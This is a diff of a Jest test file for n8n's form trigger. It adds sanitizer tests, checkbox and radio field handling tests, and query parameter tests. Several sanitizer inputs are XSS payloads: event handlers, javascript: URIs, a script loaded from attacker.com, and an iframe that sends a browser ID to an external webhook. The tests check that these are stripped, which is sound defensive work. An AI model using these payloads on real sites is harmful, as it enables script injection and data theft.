@@ -1,8 +1,11 @@
+import type { Request } from 'express';
 import { mock } from 'jest-mock-extended';
 import { DateTime } from 'luxon';
 import type {
 	FormFieldsParameter,
+	IDataObject,
 	INode,
+	INodeExecutionData,
 	IWebhookFunctions,
 	MultiPartFormData,
 	NodeTypeAndVersion,
@@ -17,7 +20,9 @@ import {
 	isFormConnected,
 	sanitizeHtml,
 	validateResponseModeConfiguration,
-} from '../utils';
+	prepareFormFields,
+	addFormResponseDataToReturnItem,
+} from '../utils/utils';
 
 describe('FormTrigger, parseFormDescription', () => {
 	it('should remove HTML tags and truncate to 150 characters', () => {
@@ -59,9 +64,281 @@ describe('FormTrigger, sanitizeHtml', () => {
 				html: '<input type="text" value="test">',
 				expected: '',
 			},
+			{
+				html: '<video width="640" height="360" controls><source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">Your browser does not support the video tag.</video>',
+				expected:
+					'<video width="640" height="360" controls><source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4"></source>Your browser does not support the video tag.</video>',
+			},
+			{
+				html: '<video controls width="640" height="360" onclick="alert(\'XSS\')" style="border:10px solid red;"><source src="javascript:alert(\'XSS\')" type="video/mp4">Fallback text</video>',
+				expected:
+					'<video controls width="640" height="360"><source type="video/mp4"></source>Fallback text</video>',
+			},
+			{
+				html: "<video><source onerror=\"s=document.createElement('script');s.src='http://attacker.com/evil.js';document.body.appendChild(s);\">",
+				expected: '<video><source></source></video>',
+			},
+			{
+				html: "<iframe srcdoc=\"<script>fetch('https://YOURDOMAIN.app.n8n.cloud/webhook/pepe?id='+localStorage.getItem('n8n-browserId'))</script>\"></iframe>",
+				expected:
+					'<iframe referrerpolicy="strict-origin-when-cross-origin" allow="fullscreen; autoplay; encrypted-media"></iframe>',
+			},
 		];
 
 		givenHtml.forEach(({ html, expected }) => {
+			expect(sanitizeHtml(html)).toBe(expected);
+		});
+	});
+
+	it('should allow table elements and preserve structure', () => {
+		const tableTestCases = [
+			{
+				html: '<table><tr><td>Cell content</td></tr></table>',
+				expected: '<table><tr><td>Cell content</td></tr></table>',
+			},
+			{
+				html: '<table><thead><tr><th>Header</th></tr></thead><tbody><tr><td>Data</td></tr></tbody></table>',
+				expected:
+					'<table><thead><tr><th>Header</th></tr></thead><tbody><tr><td>Data</td></tr></tbody></table>',
+			},
+			{
+				html: '<table><thead><tr><th>Name</th><th>Age</th></tr></thead><tbody><tr><td>John</td><td>30</td></tr><tr><td>Jane</td><td>25</td></tr></tbody></table>',
+				expected:
+					'<table><thead><tr><th>Name</th><th>Age</th></tr></thead><tbody><tr><td>John</td><td>30</td></tr><tr><td>Jane</td><td>25</td></tr></tbody></table>',
+			},
+		];
+
+		tableTestCases.forEach(({ html, expected }) => {
+			expect(sanitizeHtml(html)).toBe(expected);
+		});
+	});
+
+	it('should allow tfoot elements and preserve table footer structure', () => {
+		const tfootTestCases = [
+			{
+				html: '<table><tfoot><tr><td>Footer content</td></tr></tfoot></table>',
+				expected: '<table><tfoot><tr><td>Footer content</td></tr></tfoot></table>',
+			},
+			{
+				html: '<table><thead><tr><th>Header</th></tr></thead><tbody><tr><td>Data</td></tr></tbody><tfoot><tr><td>Footer</td></tr></tfoot></table>',
+				expected:
+					'<table><thead><tr><th>Header</th></tr></thead><tbody><tr><td>Data</td></tr></tbody><tfoot><tr><td>Footer</td></tr></tfoot></table>',
+			},
+			{
+				html: '<table><tfoot><tr><th>Total</th><td>$100</td></tr></tfoot></table>',
+				expected: '<table><tfoot><tr><th>Total</th><td>$100</td></tr></tfoot></table>',
+			},
+		];
+
+		tfootTestCases.forEach(({ html, expected }) => {
+			expect(sanitizeHtml(html)).toBe(expected);
+		});
+	});
+
+	it('should preserve table cell attributes (colspan, rowspan, scope, headers)', () => {
+		const cellAttributeTestCases = [
+			{
+				html: '<table><tr><td colspan="2">Spanning cell</td></tr></table>',
+				expected: '<table><tr><td colspan="2">Spanning cell</td></tr></table>',
+			},
+			{
+				html: '<table><tr><th rowspan="3">Header</th><td>Data 1</td></tr><tr><td>Data 2</td></tr><tr><td>Data 3</td></tr></table>',
+				expected:
+					'<table><tr><th rowspan="3">Header</th><td>Data 1</td></tr><tr><td>Data 2</td></tr><tr><td>Data 3</td></tr></table>',
+			},
+			{
+				html: '<table><tr><th scope="col">Column Header</th></tr><tr><th scope="row">Row Header</th><td>Data</td></tr></table>',
+				expected:
+					'<table><tr><th scope="col">Column Header</th></tr><tr><th scope="row">Row Header</th><td>Data</td></tr></table>',
+			},
+			{
+				html: '<table><tr><th id="header1">Name</th><th id="header2">Age</th></tr><tr><td headers="header1">John</td><td headers="header2">30</td></tr></table>',
+				expected:
+					'<table><tr><th>Name</th><th>Age</th></tr><tr><td headers="header1">John</td><td headers="header2">30</td></tr></table>',
+			},
+			{
+				html: '<table><tr><td colspan="2" rowspan="2">Complex cell</td><td>Simple cell</td></tr></table>',
+				expected:
+					'<table><tr><td colspan="2" rowspan="2">Complex cell</td><td>Simple cell</td></tr></table>',
+			},
+		];
+
+		cellAttributeTestCases.forEach(({ html, expected }) => {
+			expect(sanitizeHtml(html)).toBe(expected);
+		});
+	});
+
+	it('should strip malicious attributes from table cells while preserving allowed ones', () => {
+		const maliciousCellTestCases = [
+			{
+				html: '<td onclick="alert(\'XSS\')" colspan="2" style="color: red;">Safe content</td>',
+				expected: '<td colspan="2">Safe content</td>',
+			},
+			{
+				html: '<th onmouseover="steal()" rowspan="3" class="malicious" scope="col">Header</th>',
+				expected: '<th rowspan="3" scope="col">Header</th>',
+			},
+			{
+				html: '<td headers="header1" data-evil="payload" onerror="hack()">Data</td>',
+				expected: '<td headers="header1">Data</td>',
+			},
+			{
+				html: '<th colspan="2" rowspan="2" onclick="javascript:alert(\'XSS\')" scope="colgroup">Multi-span header</th>',
+				expected: '<th colspan="2" rowspan="2" scope="colgroup">Multi-span header</th>',
+			},
+		];
+
+		maliciousCellTestCases.forEach(({ html, expected }) => {
+			expect(sanitizeHtml(html)).toBe(expected);
+		});
+	});
+
+	it('should handle complex table structures with tfoot and cell attributes', () => {
+		const complexTableTestCases = [
+			{
+				html: '<table><thead><tr><th colspan="2" scope="colgroup">Sales Report</th></tr><tr><th scope="col">Product</th><th scope="col">Revenue</th></tr></thead><tbody><tr><th scope="row">Widget A</th><td>$1,000</td></tr><tr><th scope="row">Widget B</th><td>$2,000</td></tr></tbody><tfoot><tr><th scope="row">Total</th><td colspan="1">$3,000</td></tr></tfoot></table>',
+				expected:
+					'<table><thead><tr><th colspan="2" scope="colgroup">Sales Report</th></tr><tr><th scope="col">Product</th><th scope="col">Revenue</th></tr></thead><tbody><tr><th scope="row">Widget A</th><td>$1,000</td></tr><tr><th scope="row">Widget B</th><td>$2,000</td></tr></tbody><tfoot><tr><th scope="row">Total</th><td colspan="1">$3,000</td></tr></tfoot></table>',
+			},
+			{
+				html: '<table><tbody><tr><td rowspan="2">Multi-row cell</td><td>Cell 1</td></tr><tr><td>Cell 2</td></tr></tbody><tfoot><tr><td colspan="2">Footer spans both columns</td></tr></tfoot></table>',
+				expected:
+					'<table><tbody><tr><td rowspan="2">Multi-row cell</td><td>Cell 1</td></tr><tr><td>Cell 2</td></tr></tbody><tfoot><tr><td colspan="2">Footer spans both columns</td></tr></tfoot></table>',
+			},
+		];
+
+		complexTableTestCases.forEach(({ html, expected }) => {
+			expect(sanitizeHtml(html)).toBe(expected);
+		});
+	});
+
+	it('should remove malicious attributes from table elements', () => {
+		const maliciousTableCases = [
+			{
+				html: '<table onclick="alert(\'XSS\')" class="malicious"><tr><td>Content</td></tr></table>',
+				expected: '<table><tr><td>Content</td></tr></table>',
+			},
+			{
+				html: '<thead onmouseover="steal()" id="header"><tr><th onclick="hack()">Header</th></tr></thead>',
+				expected: '<thead><tr><th>Header</th></tr></thead>',
+			},
+			{
+				html: '<tbody style="background: red;" data-evil="payload"><tr><td onerror="malicious()">Data</td></tr></tbody>',
+				expected: '<tbody><tr><td>Data</td></tr></tbody>',
+			},
+			{
+				html: '<tr onload="alert(\'XSS\')" class="row"><td onblur="steal()" title="tooltip">Cell</td></tr>',
+				expected: '<tr><td>Cell</td></tr>',
+			},
+			{
+				html: '<th onclick="javascript:alert(\'XSS\')" style="color: red;">Header</th>',
+				expected: '<th>Header</th>',
+			},
+			{
+				html: '<td onmouseover="malicious()" data-payload="evil">Cell Data</td>',
+				expected: '<td>Cell Data</td>',
+			},
+		];
+
+		maliciousTableCases.forEach(({ html, expected }) => {
+			expect(sanitizeHtml(html)).toBe(expected);
+		});
+	});
+
+	it('should handle nested content within table elements', () => {
+		const nestedTableCases = [
+			{
+				html: '<table><tr><td><strong>Bold</strong> and <em>italic</em> text</td></tr></table>',
+				expected: '<table><tr><td><strong>Bold</strong> and <em>italic</em> text</td></tr></table>',
+			},
+			{
+				html: '<table><thead><tr><th><a href="https://example.com">Link Header</a></th></tr></thead></table>',
+				expected:
+					'<table><thead><tr><th><a href="https://example.com">Link Header</a></th></tr></thead></table>',
+			},
+			{
+				html: '<table><tbody><tr><td><ul><li>Item 1</li><li>Item 2</li></ul></td></tr></tbody></table>',
+				expected:
+					'<table><tbody><tr><td><ul><li>Item 1</li><li>Item 2</li></ul></td></tr></tbody></table>',
+			},
+			{
+				html: '<table><tr><td><code>code snippet</code> and <pre>preformatted text</pre></td></tr></table>',
+				expected:
+					'<table><tr><td><code>code snippet</code> and <pre>preformatted text</pre></td></tr></table>',
+			},
+		];
+
+		nestedTableCases.forEach(({ html, expected }) => {
+			expect(sanitizeHtml(html)).toBe(expected);
+		});
+	});
+
+	it('should handle malformed table structures gracefully', () => {
+		const malformedTableCases = [
+			{
+				html: '<table><td>Cell without row</td></table>',
+				expected: '<table><td>Cell without row</td></table>',
+			},
+			{
+				html: '<thead><th>Header without table</th></thead>',
+				expected: '<thead><th>Header without table</th></thead>',
+			},
+			{
+				html: '<tbody><tr><td>Unclosed table',
+				expected: '<tbody><tr><td>Unclosed table</td></tr></tbody>',
+			},
+			{
+				html: '<tr><th>Mixed header</th><td>and data</td></tr>',
+				expected: '<tr><th>Mixed header</th><td>and data</td></tr>',
+			},
+		];
+
+		malformedTableCases.forEach(({ html, expected }) => {
+			expect(sanitizeHtml(html)).toBe(expected);
+		});
+	});
+
+	it('should prevent XSS attacks through table elements', () => {
+		const xssTableCases = [
+			{
+				html: '<table><tr><td><script>alert("XSS")</script>Safe content</td></tr></table>',
+				expected: '<table><tr><td>Safe content</td></tr></table>',
+			},
+			{
+				html: '<thead><tr><th><img src="x" onerror="alert(\'XSS\')">Header</th></tr></thead>',
+				expected: '<thead><tr><th><img src="x" />Header</th></tr></thead>',
+			},
+			{
+				html: '<tbody><tr><td><a href="javascript:alert(\'XSS\')">Malicious Link</a></td></tr></tbody>',
+				expected: '<tbody><tr><td><a>Malicious Link</a></td></tr></tbody>',
+			},
+			{
+				html: '<table><tr><td><iframe src="javascript:alert(\'XSS\')"></iframe></td></tr></table>',
+				expected:
+					'<table><tr><td><iframe referrerpolicy="strict-origin-when-cross-origin" allow="fullscreen; autoplay; encrypted-media"></iframe></td></tr></table>',
+			},
+		];
+
+		xssTableCases.forEach(({ html, expected }) => {
+			expect(sanitizeHtml(html)).toBe(expected);
+		});
+	});
+
+	it('should preserve complex table layouts', () => {
+		const complexTableCases = [
+			{
+				html: '<table><thead><tr><th>Product</th><th>Price</th><th>Stock</th></tr></thead><tbody><tr><td>Widget A</td><td>$10.99</td><td>50</td></tr><tr><td>Widget B</td><td>$15.99</td><td>25</td></tr></tbody></table>',
+				expected:
+					'<table><thead><tr><th>Product</th><th>Price</th><th>Stock</th></tr></thead><tbody><tr><td>Widget A</td><td>$10.99</td><td>50</td></tr><tr><td>Widget B</td><td>$15.99</td><td>25</td></tr></tbody></table>',
+			},
+			{
+				html: '<table><tr><th>Q1</th><th>Q2</th><th>Q3</th><th>Q4</th></tr><tr><td>100</td><td>150</td><td>200</td><td>175</td></tr></table>',
+				expected:
+					'<table><tr><th>Q1</th><th>Q2</th><th>Q3</th><th>Q4</th></tr><tr><td>100</td><td>150</td><td>200</td><td>175</td></tr></table>',
+			},
+		];
+
+		complexTableCases.forEach(({ html, expected }) => {
 			expect(sanitizeHtml(html)).toBe(expected);
 		});
 	});
@@ -199,7 +476,6 @@ describe('FormTrigger, formWebhook', () => {
 				'https://n8n.io/?utm_source=n8n-internal&utm_medium=form-trigger&utm_campaign=instanceId',
 			testRun: true,
 			useResponseData: false,
-			validForm: true,
 		});
 	});
 
@@ -246,7 +522,6 @@ describe('FormTrigger, formWebhook', () => {
 					'https://n8n.io/?utm_source=n8n-internal&utm_medium=form-trigger&utm_campaign=instanceId',
 				testRun: true,
 				useResponseData: false,
-				validForm: true,
 			});
 		}
 	});
@@ -349,7 +624,6 @@ describe('FormTrigger, prepareFormData', () => {
 
 		expect(result).toEqual({
 			testRun: false,
-			validForm: true,
 			formTitle: 'Test Form',
 			formDescription: 'This is a test form',
 			formDescriptionMetadata: 'This is a test form',
@@ -451,7 +725,6 @@ describe('FormTrigger, prepareFormData', () => {
 
 		expect(result).toEqual({
 			testRun: true,
-			validForm: true,
 			formTitle: 'Test Form',
 			formDescription: 'This is a test form',
 			formDescriptionMetadata: 'This is a test form',
@@ -511,7 +784,6 @@ describe('FormTrigger, prepareFormData', () => {
 			query: {},
 		});
 
-		expect(result.validForm).toBe(false);
 		expect(result.formFields).toEqual([]);
 	});
 
@@ -589,6 +861,440 @@ describe('FormTrigger, prepareFormData', () => {
 	});
 });
 
+describe('FormTrigger, prepareFormData - Checkbox and Radio Fields', () => {
+	it('should correctly handle checkbox fields', () => {
+		const formFields: FormFieldsParameter = [
+			{
+				fieldLabel: 'Hobbies',
+				fieldType: 'checkbox',
+				requiredField: false,
+				fieldOptions: {
+					values: [{ option: 'Reading' }, { option: 'Gaming' }, { option: 'Sports' }],
+				},
+			},
+		];
+
+		const query = { Hobbies: 'Reading,Gaming' };
+
+		const result = prepareFormData({
+			formTitle: 'Test Form',
+			formDescription: 'This is a test form',
+			formSubmittedText: 'Thank you',
+			redirectUrl: 'example.com',
+			formFields,
+			testRun: false,
+			query,
+		});
+
+		expect(result.formFields[0].isMultiSelect).toBe(true);
+		expect(result.formFields[0].multiSelectOptions).toEqual([
+			{ id: 'option0_field-0', label: 'Reading' },
+			{ id: 'option1_field-0', label: 'Gaming' },
+			{ id: 'option2_field-0', label: 'Sports' },
+		]);
+	});
+
+	it('should correctly handle radio fields', () => {
+		const formFields: FormFieldsParameter = [
+			{
+				fieldLabel: 'Preferred Contact Method',
+				fieldType: 'radio',
+				requiredField: true,
+				fieldOptions: {
+					values: [{ option: 'Email' }, { option: 'Phone' }, { option: 'Text Message' }],
+				},
+			},
+		];
+
+		const query = { 'Preferred Contact Method': 'Email' };
+
+		const result = prepareFormData({
+			formTitle: 'Test Form',
+			formDescription: 'This is a test form',
+			formSubmittedText: 'Thank you',
+			redirectUrl: 'example.com',
+			formFields,
+			testRun: false,
+			query,
+		});
+
+		expect(result.formFields[0].radioSelect).toBe('radio');
+		expect(result.formFields[0].multiSelectOptions).toEqual([
+			{ id: 'option0_field-0', label: 'Email' },
+			{ id: 'option1_field-0', label: 'Phone' },
+			{ id: 'option2_field-0', label: 'Text Message' },
+		]);
+		expect(result.formFields[0].defaultValue).toBe('Email');
+	});
+
+	it('should handle checkbox fields with no default selection', () => {
+		const formFields: FormFieldsParameter = [
+			{
+				fieldLabel: 'Newsletter Subscriptions',
+				fieldType: 'checkbox',
+				requiredField: false,
+				fieldOptions: {
+					values: [{ option: 'Tech News' }, { option: 'Product Updates' }],
+				},
+			},
+		];
+
+		const query = {};
+
+		const result = prepareFormData({
+			formTitle: 'Test Form',
+			formDescription: 'This is a test form',
+			formSubmittedText: 'Thank you',
+			redirectUrl: 'example.com',
+			formFields,
+			testRun: false,
+			query,
+		});
+
+		expect(result.formFields[0].isMultiSelect).toBe(true);
+		expect(result.formFields[0].defaultValue).toBe('');
+		expect(result.formFields[0].multiSelectOptions).toEqual([
+			{ id: 'option0_field-0', label: 'Tech News' },
+			{ id: 'option1_field-0', label: 'Product Updates' },
+		]);
+	});
+
+	it('should handle radio fields with no default selection', () => {
+		const formFields: FormFieldsParameter = [
+			{
+				fieldLabel: 'Experience Level',
+				fieldType: 'radio',
+				requiredField: false,
+				fieldOptions: {
+					values: [{ option: 'Beginner' }, { option: 'Intermediate' }, { option: 'Advanced' }],
+				},
+			},
+		];
+
+		const query = {};
+
+		const result = prepareFormData({
+			formTitle: 'Test Form',
+			formDescription: 'This is a test form',
+			formSubmittedText: 'Thank you',
+			redirectUrl: 'example.com',
+			formFields,
+			testRun: false,
+			query,
+		});
+
+		expect(result.formFields[0].radioSelect).toBe('radio');
+		expect(result.formFields[0].defaultValue).toBe('');
+		expect(result.formFields[0].multiSelectOptions).toEqual([
+			{ id: 'option0_field-0', label: 'Beginner' },
+			{ id: 'option1_field-0', label: 'Intermediate' },
+			{ id: 'option2_field-0', label: 'Advanced' },
+		]);
+	});
+
+	it('should handle mixed form with checkbox, radio, and other field types', () => {
+		const formFields: FormFieldsParameter = [
+			{
+				fieldLabel: 'Name',
+				fieldType: 'text',
+				requiredField: true,
+				placeholder: 'Enter your name',
+			},
+			{
+				fieldLabel: 'Skills',
+				fieldType: 'checkbox',
+				requiredField: false,
+				fieldOptions: {
+					values: [{ option: 'JavaScript' }, { option: 'Python' }, { option: 'Java' }],
+				},
+			},
+			{
+				fieldLabel: 'Employment Status',
+				fieldType: 'radio',
+				requiredField: true,
+				fieldOptions: {
+					values: [{ option: 'Full-time' }, { option: 'Part-time' }, { option: 'Freelancer' }],
+				},
+			},
+		];
+
+		const query = {
+			Name: 'John Doe',
+			Skills: 'JavaScript,Python',
+			'Employment Status': 'Full-time',
+		};
+
+		const result = prepareFormData({
+			formTitle: 'Developer Survey',
+			formDescription: 'Tell us about yourself',
+			formSubmittedText: 'Thank you for participating',
+			redirectUrl: 'example.com/thanks',
+			formFields,
+			testRun: false,
+			query,
+		});
+
+		expect(result.formFields[0]).toEqual({
+			id: 'field-0',
+			errorId: 'error-field-0',
+			label: 'Name',
+			inputRequired: 'form-required',
+			defaultValue: 'John Doe',
+			placeholder: 'Enter your name',
+			isInput: true,
+			type: 'text',
+		});
+
+		expect(result.formFields[1].isMultiSelect).toBe(true);
+		expect(result.formFields[1].multiSelectOptions).toEqual([
+			{ id: 'option0_field-1', label: 'JavaScript' },
+			{ id: 'option1_field-1', label: 'Python' },
+			{ id: 'option2_field-1', label: 'Java' },
+		]);
+
+		expect(result.formFields[2].radioSelect).toBe('radio');
+		expect(result.formFields[2].defaultValue).toBe('Full-time');
+		expect(result.formFields[2].multiSelectOptions).toEqual([
+			{ id: 'option0_field-2', label: 'Full-time' },
+			{ id: 'option1_field-2', label: 'Part-time' },
+			{ id: 'option2_field-2', label: 'Freelancer' },
+		]);
+	});
+
+	it('should handle checkbox fields with unique IDs when multiple checkbox fields exist', () => {
+		const formFields: FormFieldsParameter = [
+			{
+				fieldLabel: 'Programming Languages',
+				fieldType: 'checkbox',
+				requiredField: false,
+				fieldOptions: {
+					values: [{ option: 'JavaScript' }, { option: 'Python' }],
+				},
+			},
+			{
+				fieldLabel: 'Frameworks',
+				fieldType: 'checkbox',
+				requiredField: false,
+				fieldOptions: {
+					values: [{ option: 'React' }, { option: 'Vue' }],
+				},
+			},
+		];
+
+		const query = {
+			'Programming Languages': 'JavaScript',
+			Frameworks: 'React,Vue',
+		};
+
+		const result = prepareFormData({
+			formTitle: 'Tech Survey',
+			formDescription: 'Your tech preferences',
+			formSubmittedText: 'Thanks!',
+			redirectUrl: 'example.com',
+			formFields,
+			testRun: false,
+			query,
+		});
+
+		expect(result.formFields[0].multiSelectOptions).toEqual([
+			{ id: 'option0_field-0', label: 'JavaScript' },
+			{ id: 'option1_field-0', label: 'Python' },
+		]);
+
+		expect(result.formFields[1].multiSelectOptions).toEqual([
+			{ id: 'option0_field-1', label: 'React' },
+			{ id: 'option1_field-1', label: 'Vue' },
+		]);
+	});
+
+	it('should handle radio fields with unique IDs when multiple radio fields exist', () => {
+		const formFields: FormFieldsParameter = [
+			{
+				fieldLabel: 'Experience Level',
+				fieldType: 'radio',
+				requiredField: true,
+				fieldOptions: {
+					values: [{ option: 'Junior' }, { option: 'Senior' }],
+				},
+			},
+			{
+				fieldLabel: 'Work Preference',
+				fieldType: 'radio',
+				requiredField: true,
+				fieldOptions: {
+					values: [{ option: 'Remote' }, { option: 'Office' }],
+				},
+			},
+		];
+
+		const query = {
+			'Experience Level': 'Senior',
+			'Work Preference': 'Remote',
+		};
+
+		const result = prepareFormData({
+			formTitle: 'Job Survey',
+			formDescription: 'Your work preferences',
+			formSubmittedText: 'Thanks!',
+			redirectUrl: 'example.com',
+			formFields,
+			testRun: false,
+			query,
+		});
+
+		expect(result.formFields[0].multiSelectOptions).toEqual([
+			{ id: 'option0_field-0', label: 'Junior' },
+			{ id: 'option1_field-0', label: 'Senior' },
+		]);
+
+		expect(result.formFields[1].multiSelectOptions).toEqual([
+			{ id: 'option0_field-1', label: 'Remote' },
+			{ id: 'option1_field-1', label: 'Office' },
+		]);
+	});
+});
+
+describe('addFormResponseDataToReturnItem - Checkbox and Radio Fields', () => {
+	it('should process checkbox field data correctly', () => {
+		const returnItem: INodeExecutionData = { json: {} };
+		const formFields: FormFieldsParameter = [
+			{
+				fieldLabel: 'Hobbies',
+				fieldType: 'checkbox',
+				requiredField: false,
+				fieldOptions: {
+					values: [{ option: 'Reading' }, { option: 'Gaming' }],
+				},
+			},
+		];
+		const bodyData: IDataObject = {
+			'field-0': '["Reading", "Gaming"]',
+		};
+
+		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
+
+		expect(returnItem.json.Hobbies).toEqual(['Reading', 'Gaming']);
+	});
+
+	it('should process radio field data correctly', () => {
+		const returnItem: INodeExecutionData = { json: {} };
+		const formFields: FormFieldsParameter = [
+			{
+				fieldLabel: 'Preferred Contact',
+				fieldType: 'radio',
+				requiredField: true,
+				fieldOptions: {
+					values: [{ option: 'Email' }, { option: 'Phone' }],
+				},
+			},
+		];
+		const bodyData: IDataObject = {
+			'field-0': '["Email"]',
+		};
+
+		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
+
+		expect(returnItem.json['Preferred Contact']).toBe('Email');
+	});
+
+	it('should handle radio field with array value by taking first element', () => {
+		const returnItem: INodeExecutionData = { json: {} };
+		const formFields: FormFieldsParameter = [
+			{
+				fieldLabel: 'Priority Level',
+				fieldType: 'radio',
+				requiredField: true,
+				fieldOptions: {
+					values: [{ option: 'High' }, { option: 'Medium' }, { option: 'Low' }],
+				},
+			},
+		];
+		const bodyData: IDataObject = {
+			'field-0': '["High", "Medium"]',
+		};
+
+		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
+
+		expect(returnItem.json['Priority Level']).toBe('High');
+	});
+
+	it('should handle checkbox field with null value', () => {
+		const returnItem: INodeExecutionData = { json: {} };
+		const formFields: FormFieldsParameter = [
+			{
+				fieldLabel: 'Optional Features',
+				fieldType: 'checkbox',
+				requiredField: false,
+				fieldOptions: {
+					values: [{ option: 'Feature A' }, { option: 'Feature B' }],
+				},
+			},
+		];
+		const bodyData: IDataObject = {};
+
+		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
+
+		expect(returnItem.json['Optional Features']).toBeNull();
+	});
+
+	it('should handle radio field with null value', () => {
+		const returnItem: INodeExecutionData = { json: {} };
+		const formFields: FormFieldsParameter = [
+			{
+				fieldLabel: 'Rating',
+				fieldType: 'radio',
+				requiredField: false,
+				fieldOptions: {
+					values: [{ option: '1 Star' }, { option: '2 Stars' }],
+				},
+			},
+		];
+		const bodyData: IDataObject = {};
+
+		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
+
+		expect(returnItem.json.Rating).toBeNull();
+	});
+
+	it('should process mixed form data with checkbox, radio, and other fields', () => {
+		const returnItem: INodeExecutionData = { json: {} };
+		const formFields: FormFieldsParameter = [
+			{
+				fieldLabel: 'Name',
+				fieldType: 'text',
+				requiredField: true,
+			},
+			{
+				fieldLabel: 'Skills',
+				fieldType: 'checkbox',
+				requiredField: false,
+				fieldOptions: {
+					values: [{ option: 'JavaScript' }, { option: 'Python' }],
+				},
+			},
+			{
+				fieldLabel: 'Experience',
+				fieldType: 'radio',
+				requiredField: true,
+				fieldOptions: {
+					values: [{ option: 'Junior' }, { option: 'Senior' }],
+				},
+			},
+		];
+		const bodyData: IDataObject = {
+			'field-0': 'John Doe',
+			'field-1': '["JavaScript", "Python"]',
+			'field-2': '["Senior"]',
+		};
+
+		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
+
+		expect(returnItem.json.Name).toBe('John Doe');
+		expect(returnItem.json.Skills).toEqual(['JavaScript', 'Python']);
+		expect(returnItem.json.Experience).toBe('Senior');
+	});
+});
+
 jest.mock('luxon', () => ({
 	DateTime: {
 		fromFormat: jest.fn().mockReturnValue({
@@ -604,6 +1310,7 @@ jest.mock('luxon', () => ({
 
 describe('prepareFormReturnItem', () => {
 	const mockContext = mock<IWebhookFunctions>({
+		getRequestObject: jest.fn().mockReturnValue({ method: 'GET', query: {} }),
 		nodeHelpers: mock({
 			copyBinaryFile: jest.fn().mockResolvedValue({}),
 		}),
@@ -736,13 +1443,35 @@ describe('prepareFormReturnItem', () => {
 		expect(DateTime.now().setZone).toHaveBeenCalledWith('America/New_York');
 	});
 
-	it('should include workflow static data for form trigger node', async () => {
+	it('should not include workflow static data for form trigger node', async () => {
 		const staticData = { queryParam: 'value' };
 		mockContext.getWorkflowStaticData.mockReturnValue(staticData);
 
 		const result = await prepareFormReturnItem(mockContext, [], 'test');
 
-		expect(result.json.formQueryParameters).toEqual(staticData);
+		expect(result.json.formQueryParameters).toBeUndefined();
+	});
+
+	it('should include query parameters if present and is trigger node', async () => {
+		mockContext.getRequestObject.mockReturnValue({
+			method: 'POST',
+			query: { param: 'value' },
+		} as unknown as Request);
+
+		const result = await prepareFormReturnItem(mockContext, [], 'test');
+
+		expect(result.json.formQueryParameters).toEqual({ param: 'value' });
+	});
+
+	it('should not include query parameters if empty', async () => {
+		mockContext.getRequestObject.mockReturnValue({
+			method: 'POST',
+			query: {},
+		} as unknown as Request);
+
+		const result = await prepareFormReturnItem(mockContext, [], 'test');
+
+		expect(result.json.formQueryParameters).toBeUndefined();
 	});
 
 	it('should return html if field name is set', async () => {
@@ -974,7 +1703,7 @@ describe('validateResponseModeConfiguration', () => {
 		]);
 
 		expect(() => validateResponseModeConfiguration(webhookFunctions)).toThrow(
-			'TestNode node not correctly configured',
+			'Unused Respond to Webhook node found in the workflow',
 		);
 	});
 
@@ -993,5 +1722,129 @@ describe('validateResponseModeConfiguration', () => {
 		webhookFunctions.getNodeParameter.mockReturnValue('onReceived');
 
 		expect(() => validateResponseModeConfiguration(webhookFunctions)).not.toThrow();
+	});
+
+	describe('prepareFormFields', () => {
+		it('should resolve expressions in html fields', async () => {
+			webhookFunctions.evaluateExpression.mockImplementation((expression) => {
+				if (expression === '{{ $json.formMode }}') {
+					return 'Title';
+				}
+			});
+
+			const result = prepareFormFields(webhookFunctions, [
+				{
+					fieldLabel: 'Custom HTML',
+					fieldType: 'html',
+					elementName: 'test',
+					html: '<h1>{{ $json.formMode }}</h1>',
+				},
+			]);
+
+			expect(result[0].html).toBe('<h1>Title</h1>');
+		});
+		it('should prepare hiddenField', async () => {
+			const result = prepareFormFields(webhookFunctions, [
+				{
+					fieldLabel: '',
+					fieldName: 'test',
+					fieldType: 'hiddenField',
+				},
+			]);
+
+			expect(result[0]).toEqual({
+				fieldLabel: 'test',
+				fieldName: 'test',
+				fieldType: 'hiddenField',
+			});
+		});
+	});
+});
+
+describe('addFormResponseDataToReturnItem', () => {
+	let returnItem: INodeExecutionData;
+
+	beforeEach(() => {
+		returnItem = { json: {} };
+	});
+
+	test('should use fieldName if fieldLabel is missing', () => {
+		const formFields: FormFieldsParameter = [
+			{ fieldName: 'Alternative Field', fieldType: 'hiddenField' },
+		] as FormFieldsParameter;
+		const bodyData: IDataObject = { 'field-0': 'Test Value' };
+
+		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
+		expect(returnItem.json['Alternative Field']).toBe('Test Value');
+	});
+
+	it('should handle null values', () => {
+		const formFields: FormFieldsParameter = [{ fieldLabel: 'Test Field', fieldType: 'text' }];
+		const bodyData: IDataObject = {};
+
+		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
+		expect(returnItem.json['Test Field']).toBeNull();
+	});
+
+	it('should process html fields and set elementName', () => {
+		const formFields: FormFieldsParameter = [
+			{ fieldLabel: 'HTML Field', elementName: 'htmlElement', fieldType: 'html' },
+		];
+		const bodyData: IDataObject = { 'field-0': '<p>HTML Content</p>' };
+
+		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
+		expect(returnItem.json.htmlElement).toBe('<p>HTML Content</p>');
+	});
+
+	it('should parse number fields correctly', () => {
+		const formFields: FormFieldsParameter = [{ fieldLabel: 'Number Field', fieldType: 'number' }];
+		const bodyData: IDataObject = { 'field-0': '42' };
+
+		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
+		expect(returnItem.json['Number Field']).toBe(42);
+	});
+
+	it('should trim text fields', () => {
+		const formFields: FormFieldsParameter = [{ fieldLabel: 'Text Field', fieldType: 'text' }];
+		const bodyData: IDataObject = { 'field-0': '   hello world   ' };
+
+		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);
+		expect(returnItem.json['Text Field']).toBe('hello world');
+	});
+
+	it('should parse radio field from JSON', () => {
+		const formFields: FormFieldsParameter = [{ fieldLabel: 'Radio Field', fieldType: 'radio' }];
+		const bodyData: IDataObject = { 'field-0': '["option1"]' };
+
